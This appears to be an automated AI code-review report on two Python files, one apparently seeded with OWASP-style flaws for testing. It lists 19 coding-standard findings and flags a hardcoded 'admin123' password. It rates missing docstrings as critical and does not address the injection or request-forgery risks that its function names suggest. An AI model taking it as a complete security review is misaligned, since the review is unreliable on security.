- `org_protocols: none`: “No security-protocol or security-standard documents were found in the Knowledge Base. This finding is reported on the basis of the agent's semantic analysis of the code. MIIPE may raise severity deterministically in a later step.”

## Code Consistency

- Findings: 19
- Files: 2

### 1. Hardcoded magic string used as a credential constant

- Severity: critical
- Location: `app.py:7`

`ADMIN_PASSWORD = "admin123"` embeds a literal password directly in source code. The standards prohibit magic numbers/strings — named constants must not themselves be raw secret literals baked into the codebase. Credentials must be sourced from environment variables or a secrets manager, not committed as string literals.

**Citations:**
- `coding_standards.md`: “No magic numbers — use named constants”

### 2. Public function missing type hints

- Severity: critical
- Location: `app.py:9`

`login_user(username, password)` declares no parameter or return type hints. All public functions must carry type hints per the Python section of the coding standards. Fix: annotate as `def login_user(username: str, password: str) -> list:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 3. Public function missing docstring

- Severity: critical
- Location: `app.py:9`

`login_user` has no docstring. The coding standards require docstrings on all public functions and classes. A docstring describing the function's purpose, parameters, and return value must be added.

**Citations:**
- `coding_standards.md`: “Docstrings required on public functions/classes”

### 4. Function violates Single Responsibility Principle

- Severity: warning
- Location: `app.py:9`

`login_user` both constructs a database connection AND executes a query AND returns results — multiple distinct responsibilities in one function. Per the SOLID/SRP rule, each function should have one reason to change. Database connection management should be separated from query execution.

**Citations:**
- `coding_standards.md`: “S — Single Responsibility: one reason to change”

### 5. Public function missing type hints

- Severity: critical
- Location: `app.py:20`

`fetch_remote_url(user_input)` declares no parameter or return type hints. Fix: annotate as `def fetch_remote_url(user_input: str) -> str:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 6. Public function missing docstring

- Severity: critical
- Location: `app.py:20`

`fetch_remote_url` has no docstring. A docstring describing the function's purpose, parameters, and return value must be added.

**Citations:**
- `coding_standards.md`: “Docstrings required on public functions/classes”

### 7. Public function missing type hints

- Severity: critical
- Location: `app.py:26`

`create_session_token(secret_value)` declares no parameter or return type hints. Fix: annotate as `def create_session_token(secret_value: str) -> str:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 8. Public function missing docstring

- Severity: critical
- Location: `app.py:26`

`create_session_token` has no docstring. A docstring describing the function's purpose, parameters, and return value must be added.

**Citations:**
- `coding_standards.md`: “Docstrings required on public functions/classes”

### 9. Public function missing type hints

- Severity: critical
- Location: `app.py:30`

`write_debug_log(user_name)` declares no parameter or return type hints. Fix: annotate as `def write_debug_log(user_name: str) -> None:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 10. Public function missing docstring

- Severity: critical
- Location: `app.py:30`

`write_debug_log` has no docstring. A docstring describing the function's purpose, parameters, and return value must be added.

**Citations:**
- `coding_standards.md`: “Docstrings required on public functions/classes”

### 11. Public function missing type hints

- Severity: critical
- Location: `app.py:35`

`remove_user(user_name)` declares no parameter or return type hints. Fix: annotate as `def remove_user(user_name: str) -> bool:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 12. Public function missing docstring

- Severity: critical
- Location: `app.py:35`

`remove_user` has no docstring. A docstring describing the function's purpose, parameters, and return value must be added.

**Citations:**
- `coding_standards.md`: “Docstrings required on public functions/classes”

### 13. Hardcoded magic string used as a credential constant

- Severity: critical
- Location: `owasp_violation_push.py:11`

`ADMIN_PASSWORD = "admin123"` embeds a literal password directly in source code. Credentials must be sourced from environment variables or a secrets manager, not committed as string literals.

**Citations:**
- `coding_standards.md`: “No magic numbers — use named constants”

### 14. Public function missing type hints

- Severity: critical
- Location: `owasp_violation_push.py:14`

`login_user(username, password)` has a docstring but no parameter or return type hints. Fix: annotate as `def login_user(username: str, password: str) -> list:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 15. Function violates Single Responsibility Principle

- Severity: warning
- Location: `owasp_violation_push.py:14`

`login_user` manages a DB connection, builds a query, executes it, and returns results — multiple responsibilities. Connection management should be separated from query logic.

**Citations:**
- `coding_standards.md`: “S — Single Responsibility: one reason to change”

### 16. Public function missing type hints

- Severity: critical
- Location: `owasp_violation_push.py:27`

`fetch_user_data(url)` has a docstring but no parameter or return type hints. Fix: annotate as `def fetch_user_data(url: str) -> str:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 17. Public function missing type hints

- Severity: critical
- Location: `owasp_violation_push.py:33`

`create_session_token(secret_value)` has a docstring but no parameter or return type hints. Fix: annotate as `def create_session_token(secret_value: str) -> str:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 18. Public function missing type hints

- Severity: critical
- Location: `owasp_violation_push.py:38`

`delete_temp_files(username)` has a docstring but no parameter or return type hints. Fix: annotate as `def delete_temp_files(username: str) -> bool:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”

### 19. Public function missing type hints

- Severity: critical
- Location: `owasp_violation_push.py:44`

`debug_log(message)` has a docstring but no parameter or return type hints. Fix: annotate as `def debug_log(message: str) -> None:`.

**Citations:**
- `coding_standards.md`: “Type hints required on all public functions”
